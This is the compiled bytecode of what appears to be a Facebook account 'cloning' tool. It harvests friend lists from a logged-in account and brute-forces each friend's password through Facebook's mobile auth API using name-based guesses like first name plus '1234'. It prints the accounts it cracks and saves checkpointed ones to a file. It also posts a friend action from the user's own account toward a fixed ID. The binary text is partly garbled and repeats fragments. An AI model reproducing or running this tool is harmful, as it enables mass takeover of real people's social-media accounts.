�
D1�_c           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d d �d d	 f g e _ d
 �  Z d �  Z d �  Z d �  Z d �  Z d �  Z  d �  Z! d Z" d �  Z# d Z$ g  Z% g  Z& g  a' g  Z( g  Z) d Z* d Z+ e  j, d � d GHd Z- d Z. d Z/ x� e/ d k rTe0 d � Z1 e1 e- k r?e0 d � Z2 e2 e. k r*d e1 GHe j3 d � d Z/ n d  GHe  j, d! � n d" GHe  j, d! � q�Wd# �  Z4 d$ �  Z5 d% �  Z6 d& �  Z7 d' �  Z8 d( �  Z9 d) �  Z9 d* �  Z: d+ �  Z; e< d, k r�e5 �  n  e= �  d S(-   i����N(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j �  d  S(   Ns   [1;91mExit(   t   ost   syst   exit(    (    (    s   /sdcard/IQra.pyt   keluar   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t | � d � | 7} q Wt | � S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/IQra.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  | � } | j d | d t d | � � } q W| d 7} | j d d � } t j j | d � d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   /sdcard/IQra.pyR   #   s    (
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g�������?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/IQra.pyt   jalan-   s    c          C   s�   t  j d � t GHt d � }  y` t j d |  � } t j | j � } | d } t	 d d � } | j
 |  � | j �  t �  WnU t k
 r� d GHt d � } | d	 k r� t �  q� | d
 k r� t �  q� t �  n Xd  S(   Nt   clears   [1;97m[+] Token :s+   https://graph.facebook.com/me?access_token=t   names	   login.txtR   s   [1;91m[!] Wrongs6   [1;91m[?] [1;92mWant to pick up token?[1;97m[y/n]: R
   t   y(   R   t   systemt   logot	   raw_inputt   requestst   gett   jsont   loadst   textt   openR   t   closet   menut   KeyErrorR   t   login(   t   tokett   otwt   at   namat   zeddR    (    (    s   /sdcard/IQra.pyt   tokenz2   s&    



c         C   s�   d GHy t  j d � Wn t k
 r) n Xt d d � } yW t j d d |  �} t j | j � } | j	 | d � | j
 �  d GHd	 GHt �  Wnc t k
 r� d
 GHd GHt  j d � t �  n5 t j j k
 r� d
 GHd GHt  j d � t �  n Xd  S(   Ns   [*] Generate access token t   cookies   cookie/token.logR   s'   https://api.facebook.com/restserver.phpt   paramst   access_tokens&   [*] successfully generate access tokens3   [*] Your access token is stored in cookie/token.logs#   [!] Failed to generate access tokens-   [!] Check your connection / email or passwords   [!] Connection error !!!(   R   t   mkdirt   OSErrorR-   R(   R)   R*   R+   R,   R   R.   R/   R0   t   removet
   exceptionsR   (   t   dataR   t   rR4   (    (    s   /sdcard/IQra.pyR)   H   s0    

c           C   sq   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � d  S(   NR"   s	   login.txtR@   s   [1;94mToken invalids   rm -rf login.txti   (	   R   R%   R-   t   readR2   t   IOErrorR   R   R1   (    (    (    s   /sdcard/IQra.pyt   phonee   s    s�  
[1;93m=°=°=> ####  #######  ########     ### <=°=°=   
[1;92m=°=°=>  ##  ##     ## ##     ##   ## ## <=°=°= 
[1;93m=°=°=>  ##  ##     ## ##     ##  ##   ## <=°=°=
[1;92m=°=°=>  ##  ##     ## ########  ##     ## <=°=°=
[1;93m=°=°=>  ##  ##  ## ## ##   ##   ######### <=°=°=
[1;92m=°=°=>  ##  ##    ##  ##    ##  ##     ## <=°=°=
[1;93m=°=°=> ####  ##### ## ##     ## ##     ## <=°=°=
-----------------------------------------------
[1;93m* Author        : IQra Khan
[1;93m* Github        : https://github.com/iqra_420
[1;93m* Whatsapp      : +923328219125
-----------------------------------------------c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s�   [1;93mTamoo Creationsв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’..99% [1;93mg�������?(   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/IQra.pyt   tik�   s
      i    s   [31mNot Vulns	   [32mVulnR"   sI  
[1;93m=°=°=> ####  #######  ########     ###    
[1;92m=°=°=>  ##  ##     ## ##     ##   ## ##  
[1;93m=°=°=>  ##  ##     ## ##     ##  ##   ## 
[1;92m=°=°=>  ##  ##     ## ########  ##     ## 
[1;93m=°=°=>  ##  ##  ## ## ##   ##   ######### 
[1;92m=°=°=>  ##  ##    ##  ##    ##  ##     ## 
[1;93m=°=°=> ####  ##### ## ##     ## ##     ## 
-----------------------------------------------
[1;93m* Author        : IQra Khan
[1;93m* Github        : https://github.com/iqra_420
[1;93m* Whatsapp      : +923328219125
-----------------------------------------------t   IQRAt   PAGALt   trues8   [1;91m[+] [1;91m [1;91mTool Username [1;91m: [1;97ms8   [1;91m[+] [1;91m [1;91mTool Password [1;91m: [1;97ms   Logged in successfully as i   t   falses   [1;97mWrong Passwords$   xdg-open https://wa.me/+923328219125s   [1;97mWrong Usernamec           C   s   t  j d � t �  d  S(   NR"   (   R   R%   R1   (    (    (    s   /sdcard/IQra.pyt   lisensi�   s    c           C   sw   t  j d � t GHd GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � t �  d  S(   NR"   s?   [1;91m[1][1;47m[1;31mLogin With Facebook              [1;0mg�������?s?   [1;92m[2][1;47m[1;31mLogin With Token                 [1;0ms?   [1;93m[3][1;47m[1;31mDownload Token App               [1;0ms;   [1;95m[4][1;47m[1;31mMy WhatsApp Number           [1;0ms?   [1;96m[0][1;47m[1;31mExit                             [1;0m(   R   R%   R&   R   R   t   pilih_login(    (    (    s   /sdcard/IQra.pyR1   �   s    c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r= t �  n~ |  d k rS t �  nh |  d k rv t j d � t �  nE |  d k r� t j d	 � t �  n" |  d
 k r� t �  n d GHt �  d  S(   Ns)   
[1;97m[+] [0;31mSelect Option: [1;91mR
   s   [1;91mFill in correctlyt   1t   2t   3s   xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversiont   4s$   xdg-open https://wa.me/+923328219125t   0s   [1;91m[!] Wrong input(   R'   RL   t   login1R7   R   R%   R1   R   (   t   peak(    (    s   /sdcard/IQra.pyRL   �   s$    





c          C   s�  t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t j d � t GHd d GHd GHd GHt	 d	 � } t	 d
 � } t
 �  y t j d � Wn  t j k
 r� d GHt �  n Xt t j _ t j d d � | t j d <| t j d <t j �  t j �  } d | k rdy!d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d  d! 6| d 6d" d# 6d$ d% 6} t j d& � } | j | � | j �  } | j i | d' 6� d( } t j | d) | �} t j | j � }	 t d d* � }
 |
 j |	 d+ � |
 j  �  d, GHt j! d- |	 d+ � t �  Wqdt j" j# k
 r`d GHt �  qdXn  d. | k r�d/ GHt  j d0 � t j d1 � t �  q�d2 GHt  j d0 � t j d1 � t$ �  n Xd  S(3   NR"   s	   login.txtR@   g�������?i/   t   -s9   [1;97m[+][1;47m[1;31mLOGIN WITH FACEBOOK[1;97m [1;0mt   	s.   [1;97m[!] [1;97mNumber/Email[1;97m: [1;97ms.   [1;97m[+] [1;97mPassword[1;97m    : [1;97ms   https://m.facebook.coms'   
[1;97mThere is no internet connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatRM   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodRQ   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpR9   R   R:   s$   [1;47m[1;91mLogin Successful[1;0msM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=t
   checkpoints.   
[1;97mв€†CPв€† Creat A New Accounts   rm -rf login.txti   s   
[1;97mPassword/Email is wrong(%   R   R%   R-   R/   R0   RB   R   R   R&   R'   RF   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestR(   R)   R*   R+   R,   R   R.   t   postR>   R   R1   (   R2   t   idt   pwdt   urlRg   R?   R   R4   R@   R   t   unikers(    (    s   /sdcard/IQra.pyRR   �   sl    	
S

c          C   s   t  j d � y t d d � j �  }  WnD t k
 rl t  j d � d GHt  j d � t j d � t �  n Xyv t j	 d |  � } t
 j | j � } | d } | d	 } t j	 d
 |  � } t
 j | j � } t | d d � } Wnf t k
 r)t  j d � d GHt  j d � t j d � t �  n# t j j k
 rKd GHt �  n Xt  j d � t GHd GHt j d � d t d GHt j d � d | d GHt j d � d d GHd GHt j d � d GHt j d � d GHt j d � d GHt j d � t �  d  S(   NR"   s	   login.txtR@   s   [1;94mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=R#   Rx   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts,   [1;97mв€†CPв€†Creat A New Accounts&   [1;94mThere is no internet connections3   [1;37m[!][1;91m Logged in User Information[1;92mg�������?s*   [1;37m[вЂў][1;91m Name[1;93m:[1;91ms   [1;93m               s(   [1;37m[вЂў][1;91m ID[1;93m:[1;91ms   [1;93m              i/   RT   sJ   [1;92m[1][1;47m[1;31mStart Fast Cloning                          [1;0msM   [1;93m[2][1;47m[1;31mID Not Found Problem Solve                     [1;0msL   [1;94m[3][1;47m[1;31mRest/Update IQra Tool                         [1;0msH   [1;95m[0][1;47m[1;31mExit                                      [1;0m(   R   R%   R-   RA   RB   R   R   R1   R(   R)   R*   R+   R,   R   R0   R>   R   R   R&   R#   t   pilih(   R2   RE   R4   R5   Rx   t   tR   t   sub(    (    s   /sdcard/IQra.pyR/     sX    


	c          C   sO  t  d � }  |  d k r' d GHt �  n$|  d k r= t �  n|  d k r` t j d � t �  n� |  d k rt j d � t GHd	 GHt d
 � t d � t d � t d � t d � t d � t d � t d � t d � t d � t d � t j d � t  d � t �  n9 |  d k r?t d � t j d � t �  n d GHt �  d  S(   Ns   
[1;31mSelect Option: [1;91mR
   s   [1;91mFill in correctlyRM   RN   s7   xdg-open https://commentpicker.com/find-facebook-id.phpRO   R"   s?   [1;95m...............[1;91mDataReset[1;95m..................s   [1;91m=10%s   [1;92m==20%s   [1;93m===30%s   [1;94m====40%s   [1;95m=====50%s   [1;96m======60%s   [1;97m=======70%s   [1;96m========80%s   [1;95m=========90%s   [1;94m==========100%s1   [1;93mCloning Data Reset and update by IQra Khans   git pull origin masters   
[1;91m[ [1;97mBack [1;91m]RQ   s   Token Removeds   rm -rf login.txt(	   R'   R~   t   superR   R%   R/   R&   R!   R   (   R{   (    (    s   /sdcard/IQra.pyR~   C  sB    

















c          C   sO  t  d � }  |  d k r' d GHt �  n$|  d k r= t �  n|  d k r` t j d � t �  n� |  d k rt j d � t GHd	 GHt d
 � t d � t d � t d � t d � t d � t d � t d � t d � t d � t d � t j d � t  d � t �  n9 |  d k r?t d � t j d � t �  n d GHt �  d  S(   Ns!   
[1;91mChoose an Option: [1;97mR
   s   [1;91mFill in correctlyRM   RN   s7   xdg-open https://commentpicker.com/find-facebook-id.phpRO   R"   s?   [1;95m...............[1;91mDataReset[1;95m..................s   [1;91m=10%s   [1;92m==20%s   [1;93m===30%s   [1;94m====40%s   [1;95m=====50%s   [1;96m======60%s   [1;97m=======70%s   [1;96m========80%s   [1;95m=========90%s   [1;94m==========100%s1   [1;93mCloning Data Reset and update by IQra Khans   git pull origin masters   
[1;91m[ [1;97mBack [1;91m]RQ   s   Token Removeds   rm -rf login.txt(	   R'   R~   R�   R   R%   R/   R&   R!   R   (   R{   (    (    s   /sdcard/IQra.pyR~   f  sB    

















c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � t
 �  d  S(   NR"   s	   login.txtR@   s   [1;91mToken invalids   rm -rf login.txti   s8   [1;97m[1][1;47m[1;91mClone From Friend List    [1;0mg�������?s3   [1;97m[2][1;47m[1;91mClone From Public Id [1;0ms7   [1;97m[0][1;47m[1;91mBack                     [1;0m(   R   R%   R-   RA   R2   RB   R   R   R1   R&   t   pilih_super(    (    (    s   /sdcard/IQra.pyR�   �  s"    c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k r� t j d � d d GHt GHt j d t � } t j	 | j
 � } x9| d	 D] } t j | d
 � q~ Wn|  d k r�t j d � d d GHt GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWn' t k
 r6d GHt  d � t �  n Xt j d | d t � } t j	 | j
 � } xH | d	 D] } t j | d
 � qoWn" |  d k r�t �  n d GHt �  d t t t � � GHd d d g } x0 | D]( }	 d |	 Gt j j �  t j d � q�Wd GHd d GHd �  }
 t d � } | j |
 t � d d GHd GHd t t t � � d  t t t � � GHd d GHd! GHd d GHt  d" � t �  d  S(#   Ns(   
[1;97m[+][1;91mSelect Option: [1;97mR
   s   [1;91mFill in correctlyRM   R"   i/   RT   s3   https://graph.facebook.com/me/friends?access_token=R?   Rx   RN   s)   [1;97m[+][1;91mEnter ID[1;97m: [1;97ms   https://graph.facebook.com/s   ?access_token=s%   [1;97m[+][1;91mName[1;97m:[1;97m R#   s   [1;97m[+][1;91mID Not Found!s   
[1;96m[[1;97mBack[1;96m]s   /friends?access_token=RQ   s/   [1;97m[+][1;91mTotal Accounts[1;97m: [1;97ms   .   s   ..  s   ... s1   [1;97m[+][1;31mHacking Has Been Started[1;97mg�������?s+   
[1;97m[+][1;31mStop Process Press CTRL+Zc         S   sA  |  } y t  j d � Wn t k
 r* n Xyt j d | d t � } t j | j � } | d d } t	 j
 d | d | d � } t j | � } d	 | k rt j d | d
 | d	 � } t j | j � } d GHd | d GHd | GHd | d GHt j | | � n"
d | d k r�d GHd | d GHd | GHd | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n�	| d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k rGt j d | d
 | d	 � } t j | j � } d GHd | d GHd | GHd |
 d GHt j | |
 � n�d | d k r�d GHd | d GHd | GHd |
 d GHt d d � }	 |	 j d | d |
 d � |	 j �  t j | |
 � ni| d d } t	 j
 d | d | d � } t j | � } d	 | k r~t j d | d
 | d	 � } t j | j � } d GHd | d GHd | GHd | d GHt j | | � n�d | d k r d GHd | d GHd | GHd | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n2| d d  } t	 j
 d | d | d � } t j | � } d	 | k r�t j d | d
 | d	 � } t j | j � } d GHd | d GHd | GHd | d GHt j | | � n}d | d k r7d GHd | d GHd | GHd | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n�d! } t	 j
 d | d | d � } t j | � } d	 | k r�t j d | d
 | d	 � } t j | j � } d" GHd# | d GHd$ | GHd% | d GHt j | | � nNd | d k rfd& GHd# | d GHd$ | GHd% | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n�d' } t	 j
 d | d | d � } t j | � } d	 | k rt j d | d
 | d	 � } t j | j � } d" GHd# | d GHd$ | GHd% | d GHt j | | � nd | d k r�d& GHd# | d GHd$ | GHd% | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n�| d d( } t	 j
 d | d | d � } t j | � } d	 | k rJt j d | d
 | d	 � } t j | j � } d GHd | d GHd | GHd | d GHt j | | � n�d | d k r�d GHd | d GHd | GHd | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � nfd) } t	 j
 d | d | d � } t j | � } d	 | k ry	t j d | d
 | d	 � } t j | j � } d" GHd# | d GHd$ | GHd% | d GHt j | | � n�d | d k r�	d& GHd# | d GHd* | GHd% | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n7| d d+ } t	 j
 d | d | d � } t j | � } d	 | k r�
t j d | d
 | d	 � } t j | j � } d GHd | d GHd | GHd | d GHt j | | � n� d | d k r2d GHd | d GHd, | GHd | d GHt d d � }	 |	 j d | d | d � |	 j �  t j | | � n  Wn n Xd  S(-   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   1234s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R:   s   ?access_token=s   [1;91m[!] [1;92m[OK]s+   [1;92m[!] [1;97mName [1;97m    : [1;97mR#   s+   [1;93m[!] [1;97mID [1;97m      : [1;97ms+   [1;94m[!] [1;91mPassword [1;97m: [1;97ms   
s   www.facebook.comt	   error_msgs   [1;91m[!] [1;96m[Checkpoint]s   out/super_cp.txtR4   s   ID:s    Pw:t   123s   [1;94m[!] [1;92m[OK]s+   [1;93m[!] [1;97mName [1;97m    : [1;97ms+   [1;92m[!] [1;97mID [1;97m      : [1;97ms+   [1;91m[!] [1;91mPassword [1;97m: [1;97ms   [1;94m[!] [1;96m[Checkpoint]s+   [1;93m[!] [1;97mName [1;93m    : [1;97mt	   last_namet   1122t   786786s   [1;97m[!] [1;92m[OK]s+   [1;97m[!] [1;97mName [1;97m    : [1;97ms+   [1;97m[!] [1;97mID [1;97m      : [1;97ms+   [1;97m[!] [1;91mPassword [1;97m: [1;97ms   [1;97m[!] [1;96m[Checkpoint]t   Pakistant   12345t   000786s+   [1;97m[!] [1;97mID [1;98m      : [1;97mt   786s+   [1;94m[!] [1;97mID [1;97m      : [1;97m(   R   R;   R<   R(   R)   R2   R*   R+   R,   t   urllibt   urlopent   loadt   okst   appendR-   R   R.   t   cekpoint(   t   argt   userR4   R   t   pass1R?   t   qR   R   t   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9(    (    s   /sdcard/IQra.pyt   main�  s|   		
		
		
		
		
		
		
		
		
i   s9   [1;97m[+][1;47m [1;31mProcess Has Been Completed[1;0ms;   [1;97m[+][1;97mTotal [1;97mOK/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97ms�  
 [1;97m

 [1;96m в–€в–€в–€в–€в–€в•— в–€в–€в•—      в–€в–€в–€в–€в–€в–€в•— в–€в–€в–€в•—   в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в•—
 [1;91mв–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•‘     в–€в–€в•”в•ђв•ђв•ђв–€в–€в•—в–€в–€в–€в–€в•—  в–€в–€в•‘в–€в–€в•”в•ђв•ђв•ђв•ђв•ќ
 [1;92mв–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в•‘     в–€в–€в•‘   в–€в–€в•‘в–€в–€в•”в–€в–€в•— в–€в–€в•‘в–€в–€в–€в–€в–€в•—  
 [1;93mв–€в–€в•”в•ђв•ђв–€в–€в•‘в–€в–€в•‘     в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘в•љв–€в–€в•—в–€в–€в•‘в–€в–€в•”в•ђв•ђв•ќ  
 [1;95mв–€в–€в•‘  в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•—в•љв–€в–€в–€в–€в–€в–€в•”в•ќв–€в–€в•‘ в•љв–€в–€в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•—
 [1;96mв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќ в•љв•ђв•ђв•ђв•ђв•ђв•ќ в•љв•ђв•ќ  в•љв•ђв•ђв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќ
                                           
                                            

[1;96m в–€в–€в–€в–€в–€в–€в•—  в–€в–€в–€в–€в–€в–€в•—  в–€в–€в–€в–€в–€в–€в•— в–€в–€в–€в–€в–€в–€в•—     в–€в–€в•—     в–€в–€в•—   в–€в–€в•— в–€в–€в–€в–€в–€в–€в•—в–€в–€в•—  в–€в–€в•—
[1;95mв–€в–€в•”в•ђв•ђв•ђв•ђв•ќ в–€в–€в•”в•ђв•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•—    в–€в–€в•‘     в–€в–€в•‘   в–€в–€в•‘в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•‘ в–€в–€в•”в•ќ
[1;94mв–€в–€в•‘  в–€в–€в–€в•—в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘    в–€в–€в•‘     в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘     в–€в–€в–€в–€в–€в•”в•ќ 
[1;93mв–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘    в–€в–€в•‘     в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘     в–€в–€в•”в•ђв–€в–€в•— 
[1;92mв•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•”в•ќв–€в–€в–€в–€в–€в–€в•”в•ќ    в–€в–€в–€в–€в–€в–€в–€в•—в•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•—в–€в–€в•‘  в–€в–€в•—
[1;91mв•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќ в•љв•ђв•ђв•ђв•ђв•ђв•ќ     в•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќ в•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќ
                                                                        
      
""
	print 47*'-'
	raw_input("
[1;97m[+][1;97mBack")
	menu()

if __name__ == '__main__':
	login()
gin()
€в–€в•‘   в–€в–€в•‘в–€в–€в•‘     в–€в–€в•”в•ђв–€в–€в•— 
[1;92mв•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•”в•ќв–€в–€в–€в–€в–€в–€в•”в•ќ    в–€в–€в–€в–€в–€в–€в–€в•—в•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•—в–€в–€в•‘  в–€в–€в•—
[1;91mв•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќ в•љв•ђв•ђв•ђв•ђв•ђв•ќ     в•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќ в•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќ
                                                                        
      
s   
[1;97m[+][1;97mBack(   R'   R�   R   R%   R&   R(   R)   R2   R*   R+   R,   Rx   R�   R0   R�   R/   R   R   R   R   R   R   R   R    t   mapR�   R�   (   RS   R@   R   t   st   idtt   jokt   opR   RD   RE   R�   t   p(    (    s   /sdcard/IQra.pyR�   �  sh    
		

  		�	)	"	
t   __main__(>   R   R   R   t   datetimeR   Rs   t   ret	   threadingR*   R�   t	   cookielibR(   Rj   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRi   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R!   R7   R)   RC   R&   RF   t   backt   berhasilR�   R�   Rx   t   listgrupt   vulnott   vulnR%   t   CorrectUsernamet   CorrectPasswordt   loopR'   t   usernameR[   R   RK   R1   RL   RR   R/   R~   R�   R�   t   __name__t   gin(    (    (    s   /sdcard/IQra.pyt   <module>   sp   �
			
											9	/	#	%		� .
